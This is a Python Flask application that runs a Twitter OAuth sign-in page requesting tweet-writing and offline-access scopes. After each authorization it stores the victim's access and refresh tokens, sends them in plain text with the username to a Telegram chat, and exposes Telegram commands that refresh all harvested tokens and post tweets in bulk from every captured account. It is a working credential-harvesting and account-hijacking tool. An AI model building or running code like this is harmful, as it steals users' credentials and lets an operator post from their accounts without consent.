import os
import requests  # Add this line
from flask import Flask, redirect, request, session, render_template, url_for
from config import CLIENT_ID, CLIENT_SECRET, CALLBACK_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, DATABASE_URL
from database import init_db, store_token, restore_from_backup, get_all_tokens, get_total_tokens
from helpers import (
    send_startup_message, send_message_via_telegram, post_tweet, refresh_token_in_db,
    generate_code_verifier_and_challenge, get_twitter_username_and_profile, handle_post_single,
    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
)


app = Flask(__name__)
app.secret_key = os.urandom(24)
BACKUP_FILE = 'tokens_backup.txt'

# Initialize the database
init_db()

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')
    
    if 'username' in session:
        username = session['username']
        send_message_via_telegram(f"👋 @{username} just returned to the website.")
        return redirect(url_for('welcome'))
    
    if request.args.get('authorize') == 'true':
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier
        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state=0&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }
        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            username, profile_url = get_twitter_username_and_profile(access_token)

            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token
                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400
        else:
            return f"Error retrieving access token: {response.json().get('error_description', 'Unknown error')}", response.status_code

    return render_template('home.html')

@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
    message = f"Welcome back, @{username}!" if 'is_new_user' not in session else f"Congratulations, @{username}! Your sign-up was successful."
    session.pop('is_new_user', None)
    return render_template('welcome.html', message=message)

@app.route('/dashboard')
def dashboard():
    username = session.get('username', 'User')
    return render_template('dashboard.html', username=username)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

# Telegram bot webhook to listen for commands
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")

    return '', 200

if __name__ == '__main__':
    send_startup_message()
    restore_from_backup()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
